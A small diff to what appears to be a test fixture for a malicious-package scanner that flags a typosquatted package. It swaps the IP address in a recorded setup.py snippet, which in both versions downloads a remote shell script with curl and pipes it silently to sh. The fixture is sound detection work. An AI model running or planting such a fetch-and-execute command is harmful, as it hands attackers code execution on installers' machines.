@@ -107,7 +107,7 @@ export const BLOCKED_TYPOSQUAT = base({
       indicator: 'proc_exec',
       file: 'setup.py',
       line: 18,
-      snippet: 'os.system("curl -fsSL http://45.61.139.22/u.sh | sh >/dev/null 2>&1")',
+      snippet: 'os.system("curl -fsSL http://203.0.113.22/u.sh | sh >/dev/null 2>&1")',
     },
     {
       indicator: 'recon',
